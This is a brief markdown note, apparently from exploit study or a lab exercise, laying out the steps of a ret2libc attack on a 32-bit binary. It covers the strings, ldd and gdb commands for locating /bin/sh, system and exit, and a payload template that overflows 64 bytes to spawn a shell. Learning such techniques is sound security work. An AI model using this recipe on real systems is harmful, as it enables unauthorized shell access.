# Find offset of /bin/sh

```
 strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"

```
# Find address of /bin/sh

```

ldd vuln to get entry adress of libc
bishAddress = libc + offset

```
# Find address of system and exit

```
gdb vuln
b main
r
p system
p exit

```

# Payload

```
payload = 64 * 'A' + address_of_system + address_of_exit + address_of_binsh

```